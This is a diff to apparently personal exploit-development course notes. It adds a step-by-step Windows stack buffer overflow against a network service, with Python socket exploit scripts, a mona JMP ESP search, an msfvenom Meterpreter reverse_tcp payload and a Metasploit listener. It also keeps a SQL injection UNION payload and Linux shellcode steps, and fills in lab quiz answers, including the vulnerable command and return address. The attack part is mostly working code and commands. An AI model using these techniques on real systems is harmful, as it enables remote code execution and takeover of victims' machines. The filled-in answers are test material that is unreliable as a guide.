@@ -249,6 +249,7 @@ Step 1: Identify vulnerable field
         .php?Selection=<option> UNION SELECT @@version,pass,name FROM session.user #
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 Exploit Development Notes:
+LINUX
 
 verify it is exicutable (if cant chmod or make exicutable than move to /tmp) chmod u+x <>
 run the exicutable see what is does
@@ -318,6 +319,7 @@ nop = "\x90" * 15
 print(offset + eip + nop)
 ```
 @lin-ops:~$ msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python
+(The CMD will be whatever you are trying to do, if it has spaces, you will put in "")
 take the output and copy it to linbuff bellow nop and add buf
 ```
 #!/usr/bin/env python
@@ -335,7 +337,125 @@ nop = "\x90" * 15
 print(offset + eip + nop + buf)
 ```
 run python linbuff.py | ./func and should get student
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+Exploit Development Notes:
+WINDOWS
 
+open powershell
+strings the executable
+look for user input strings
+run the executable : .\<executable>
+run get-process -name "<process>"
+run netstat -anpo tcp | findstr /i <ID>
+on lin-ops, create our exploit winbuff.py
+```
+#!/usr/bin/env python
+
+import socket
+buf='HELP'
+s=socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('<windows ip>', <port listening>))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
+```
+run chmod +x winbuff.py
+run ./winbuff.py
+on windows, the executable will show our connection and then closed connection
+open Immunity Debugger
+maximise CPU and load up our executable
+on lin-ops, edit the script
+```
+#!/usr/bin/env python
+
+import socket
+buf='BUFF /.:/'
+buf+='A'*5000
+s=socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('<windows ip>', <port listening>))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
+```
+once run, the command hangs and back on windows it shows 0x41414141
+on wiremask, buffer overflow pattern gen, and length set 5000
+take pattern and put in buf
+```
+#!/usr/bin/env python
+
+import socket
+buf='BUFF /.:/'
+buf+='<pattern>'
+s=socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('<windows ip>', <port listening>))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
+```
+rewind immunity debugger
+and run ./winbuff.py
+take new value from immunity and on wiremask, get the offeset
+```
+#!/usr/bin/env python
+
+import socket
+buf='BUFF /.:/'
+buf+='A' * 1945
+s=socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('<windows ip>', <port listening>))
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+s.close()
+```
+immunity debugger
+on the bottom : !mona modules
+on module info, find dll with all false 
+again !mona jmp -r esp -m <.dll name>
+Window > 2. Log Data > look for first address > copy and make big and little endian 
+edit winbuff.py with memmory address and NOP sled
+```
+#!/usr/bin/env python
+
+import socket
+buf='BUFF /.:/' #command we take advantage of
+buf+='A' * 1945 #A's required to overflow program
+buf+='<little endian mem addr>' #mem addr we will eploit
+buf+='\x90'*15 #landing pad for our payload
+s=socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('<windows ip>', <port listening>)) #tgt ip, tgt port
+print s.recv(1024)
+s.send(buf) #send our BUFF cmd, A's, mem addr pointer, NOP slet,
+print s.recv(1024)
+s.close()
+```
+run @lin-ops:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<local ip> lport=4444 -b '\x00\xfe\x20\x0a\xff' -f python
+copy output except for buf=b''
+```
+#!/usr/bin/env python
+
+import socket
+buf='BUFF /.:/' #command we take advantage of
+buf+='A' * 1945 #A's required to overflow program
+buf+='<little endian mem addr>' #mem addr we will eploit
+buf+='\x90'*15 #landing pad for our payload
+buf+='<msfvenom buf output>'
+s=socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('<windows ip>', <port listening>)) #tgt ip, tgt port
+print s.recv(1024)
+s.send(buf) #send our BUFF cmd, A's, mem addr pointer, NOP sled,
+print s.recv(1024)
+s.close()
+```
+run msfconsole
+use multi/handler > show options
+set payload windows/meterpreter/reverse_tcp > set lhost 0.0.0.0 > set lport 4444
+exploit
+back on windows run program
+on lin-ops run ./winbuff.py
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 lpid - is a table in the column
@@ -744,7 +864,13 @@ Question 3:
 	
 
 Question 4:
-	
+	HELP
+	TRUN
+	TRUN COMPLETE
+	EXIT
+	GOODBYE
+	625012a0
+	\xa0\x12\x50\x62
 
 Question 5:
 	
@@ -757,4 +883,6 @@ Question 7:
 
 Question 8:
 	
+
+
 
